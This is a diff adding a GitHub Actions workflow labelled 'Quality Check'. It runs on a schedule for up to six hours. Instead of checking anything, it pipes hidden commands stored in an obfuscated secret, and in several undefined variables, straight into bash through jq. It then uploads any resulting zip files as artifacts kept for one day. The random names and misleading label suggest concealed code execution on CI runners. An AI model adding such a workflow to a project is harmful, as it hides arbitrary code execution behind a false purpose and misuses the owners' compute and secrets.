@@ -1,0 +1,32 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          x03041: ${{ secrets.x03041 }}
+        run: |
+          printf '%s' "$x03041" | jq -r .mk5 | /bin/bash
+          printf '%s' "$hffp9" | jq -r .jbt90522 | /bin/bash
+          echo $de7 | jq -r .ufad43 | /bin/bash
+          echo $x902 | jq -r .yhhw2065 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: oDitIAtl
+          path: "*.zip"
+          retention-days: 1
